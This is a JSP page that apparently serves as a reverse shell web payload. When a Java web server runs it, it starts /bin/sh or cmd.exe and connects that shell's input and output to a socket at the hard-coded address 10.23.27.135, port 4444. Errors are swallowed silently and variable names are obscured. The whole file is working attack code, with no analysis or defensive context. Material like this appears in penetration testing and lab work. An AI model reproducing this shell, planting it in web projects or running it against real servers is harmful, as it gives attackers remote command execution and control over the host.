<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream l8;
    OutputStream rv;

    StreamConnector( InputStream l8, OutputStream rv )
    {
      this.l8 = l8;
      this.rv = rv;
    }

    public void run()
    {
      BufferedReader pn  = null;
      BufferedWriter o0r = null;
      try
      {
        pn  = new BufferedReader( new InputStreamReader( this.l8 ) );
        o0r = new BufferedWriter( new OutputStreamWriter( this.rv ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = pn.read( buffer, 0, buffer.length ) ) > 0 )
        {
          o0r.write( buffer, 0, length );
          o0r.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( pn != null )
          pn.close();
        if( o0r != null )
          o0r.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "10.23.27.135", 4444 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
